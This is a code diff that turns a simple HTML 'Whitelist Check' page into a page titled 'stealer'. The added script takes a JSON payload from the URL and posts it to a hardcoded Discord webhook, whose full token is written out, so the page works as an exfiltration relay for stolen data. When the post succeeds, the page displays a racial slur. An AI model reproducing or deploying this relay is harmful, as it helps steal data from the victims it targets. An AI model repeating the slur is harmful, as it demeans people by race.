@@ -1,13 +1,47 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Whitelist Check</title>
-</head>
-<body>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>stealer</title>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const response = { allowed: true };
+        window.addEventListener("load", () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const jsonParam = urlParams.get("json");
+
+            if (!jsonParam) {
+                document.body.innerHTML = "<h1>error adding unc rejoin.</h1>";
+                return;
+            }
+
+            try {
+                const embedPayload = JSON.parse(decodeURIComponent(jsonParam));
+
+                const webhookUrl = "https://discord.com/api/webhooks/1349129327001735391/xa8wMgkYGe7Rlw6k_wre2ZeEVNdV50tlpsNs36shLasoAuw1bda6X3kzb_X7wBmMaXd8";
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(embedPayload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        document.body.innerHTML = "<h1>NIGGER!!/h1>";
+                    } else {
+                        document.body.innerHTML = `<h1>Error: ${response.statusText}</h1>`;
+                    }
+                })
+                .catch(error => {
+                    document.body.innerHTML = `<h1>Request failed: ${error.message}</h1>`;
+                });
+            } catch (error) {
+                document.body.innerHTML = `<h1>Invalid JSON payload: ${error.message}</h1>`;
+            }
         });
     </script>
+</head>
+<body>
+    <h1>Processing...</h1>
 </body>
 </html>
